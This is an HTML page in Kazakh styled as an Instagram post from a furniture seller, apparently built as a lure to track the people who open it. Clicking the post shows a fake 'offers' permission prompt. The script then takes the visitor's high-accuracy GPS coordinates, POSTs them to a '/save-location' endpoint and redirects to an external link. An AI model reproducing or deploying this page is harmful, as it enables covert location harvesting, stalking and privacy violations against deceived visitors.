<!DOCTYPE html>
<html lang="kk">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Мебель Арзан</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #000;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .phone-frame {
            width: 100%;
            max-width: 428px;
            height: 100vh;
            max-height: 926px;
            background: #000;
            position: relative;
            overflow: hidden;
        }
        @media (min-width: 500px) {
            .phone-frame {
                border-radius: 30px;
                height: 90vh;
                box-shadow: 0 0 0 2px #333, 0 20px 60px rgba(0,0,0,0.8);
            }
        }
        .status-bar {
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            padding: 12px 20px 8px;
            display: flex;
            justify-content: space-between;
            color: #fff;
            font-size: 12px;
            font-weight: 600;
            z-index: 4;
            background: transparent;
        }
        .status-bar .time { font-size: 13px; }
        .status-bar .icons { display: flex; gap: 6px; font-size: 12px; }
        
        .loader-container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            text-align: center;
            z-index: 1;
        }
        .spinner {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(255,255,255,0.1);
            border-top: 4px solid #ffffff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .loader-text { color: rgba(255,255,255,0.7); font-size: 16px; letter-spacing: 1px; }
        
        .instagram-card {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 90%;
            max-width: 360px;
            background: #1a1a1a;
            border-radius: 16px;
            overflow: hidden;
            border: 1px solid #333;
            cursor: pointer;
            z-index: 1;
            display: none;
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translate(-50%, -50%) scale(0.9); }
            to { opacity: 1; transform: translate(-50%, -50%) scale(1); }
        }
        .card-header { padding: 14px 16px; display: flex; align-items: center; border-bottom: 1px solid #2a2a2a; }
        .profile-pic { width: 34px; height: 34px; border-radius: 50%; background: #ccc; margin-right: 12px; }
        .username { font-weight: 600; font-size: 14px; color: #fff; }
        .card-image { width: 100%; aspect-ratio: 1/1; background: #2a2a2a; overflow: hidden; }
        .card-image img { width: 100%; height: 100%; object-fit: cover; }
        .card-content { padding: 14px 16px 16px; }
        .likes { font-weight: 600; font-size: 14px; color: #fff; margin-bottom: 6px; }
        .description { font-size: 14px; line-height: 1.5; color: #e0e0e0; }
        .description span { font-weight: 600; color: #fff; }
        .description .highlight { color: #0095f6; font-weight: 600; display: block; margin-top: 10px; text-align: center; background: rgba(0,149,246,0.1); padding: 10px; border-radius: 8px; border: 1px solid rgba(0,149,246,0.2); }
        .post-time { font-size: 10px; color: #8e8e8e; margin-top: 8px; letter-spacing: 0.2px; }
        
        #overlay-bg {
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: rgba(0,0,0,0.6);
            display: none;
            z-index: 2;
            animation: fadeInBg 0.3s ease;
        }
        @keyframes fadeInBg { from { opacity: 0; } to { opacity: 1; } }
        
        #permission-modal {
            position: absolute;
            bottom: 40px;
            left: 20px;
            right: 20px;
            background: #1a1a1a;
            border-radius: 16px;
            padding: 24px 20px 20px;
            display: none;
            z-index: 3;
            animation: slideUp 0.4s ease;
            border: 1px solid #333;
        }
        @keyframes slideUp {
            from { transform: translateY(50px); opacity: 0; }
            to { transform: translateY(0); opacity: 1; }
        }
        #permission-modal .modal-icon { text-align: center; font-size: 40px; margin-bottom: 8px; }
        #permission-modal h3 { text-align: center; font-size: 18px; font-weight: 600; color: #fff; margin-bottom: 6px; }
        #permission-modal p { text-align: center; font-size: 14px; color: #aaa; line-height: 1.5; margin-bottom: 18px; }
        #permission-modal .btn-primary {
            background: #0095f6; color: #fff; border: none; padding: 12px 0; border-radius: 8px;
            font-weight: 600; font-size: 16px; width: 100%; cursor: pointer;
        }
        #permission-modal .btn-primary:active { background: #0077cc; }
        #permission-modal .btn-secondary {
            background: transparent; color: #888; border: none; padding: 10px 0;
            font-size: 14px; width: 100%; cursor: pointer; margin-top: 4px;
        }
        #permission-modal .btn-secondary:active { color: #fff; }
        
        .home-indicator {
            position: absolute;
            bottom: 8px;
            left: 50%;
            transform: translateX(-50%);
            width: 134px;
            height: 5px;
            background: rgba(255,255,255,0.2);
            border-radius: 3px;
            z-index: 4;
        }
        @supports (padding: max(0px)) {
            #permission-modal { padding-bottom: max(20px, env(safe-area-inset-bottom)); }
            .home-indicator { bottom: max(8px, env(safe-area-inset-bottom)); }
        }
    </style>
</head>
<body>

<div class="phone-frame">
    
    <div class="status-bar">
        <span class="time">9:41</span>
        <span class="icons">📶 📶 🔋</span>
    </div>
    
    <div class="loader-container" id="loader">
        <div class="spinner"></div>
        <div class="loader-text">Жүктелуде...</div>
    </div>
    
    <div class="instagram-card" id="postCard" onclick="requestLocation()">
        <div class="card-header">
            <div class="profile-pic"></div>
            <div class="username">mebel_taraz_kz</div>
        </div>
        <div class="card-image">
            <img src="https://images.unsplash.com/photo-1586023492125-27b2c045efd7?q=80&w=600" alt="Мебель">
        </div>
        <div class="card-content">
            <div class="likes">Ұнатушылар: 1,424</div>
            <div class="description">
                <span>mebel_taraz_kz</span> Ең жаңа және сапалы жиһаз жиынтықтары!
                <span class="highlight">👉 Толығырақ көру үшін басыңыз</span>
            </div>
            <div class="post-time">18 МИНУТ БҰРЫН</div>
        </div>
    </div>
    
    <div id="overlay-bg"></div>
    
    <div id="permission-modal">
        <div class="modal-icon">📍</div>
        <h3>Орналасқан жеріңізді анықтау</h3>
        <p>Акциялар мен арнайы ұсыныстарды<br>көру үшін рұқсат етіңіз</p>
        <button class="btn-primary" onclick="allowLocation()">Рұқсат ету</button>
        <button class="btn-secondary" onclick="skipLocation()">Қазір емес</button>
    </div>
    
    <div class="home-indicator"></div>
</div>

<script>
    window.onload = function() {
        setTimeout(function() {
            document.getElementById('loader').style.display = 'none';
            document.getElementById('postCard').style.display = 'block';
        }, 1000);
    };
    
    function requestLocation() {
        document.getElementById('overlay-bg').style.display = 'block';
        document.getElementById('permission-modal').style.display = 'block';
    }
    
    function allowLocation() {
        closeModal();
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(sendPosition, showError, {
                enableHighAccuracy: true,
                timeout: 8000,
                maximumAge: 0
            });
        } else {
            redirectToLink();
        }
    }
    
    function sendPosition(position) {
        const lat = position.coords.latitude;
        const lng = position.coords.longitude;
        console.log('📍 Локация:', lat, lng);
        
        fetch('/save-location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ lat: lat, lng: lng })
        })
        .catch(err => console.log('Қате:', err))
        .finally(() => redirectToLink());
    }
    
    function showError(error) {
        redirectToLink();
    }
    
    function skipLocation() {
        closeModal();
        redirectToLink();
    }
    
    function closeModal() {
        document.getElementById('overlay-bg').style.display = 'none';
        document.getElementById('permission-modal').style.display = 'none';
    }
    
    function redirectToLink() {
        window.location.href = "https://share.google/ReXWND2f4dfwXYJJx";
    }
</script>

</body>
</html>
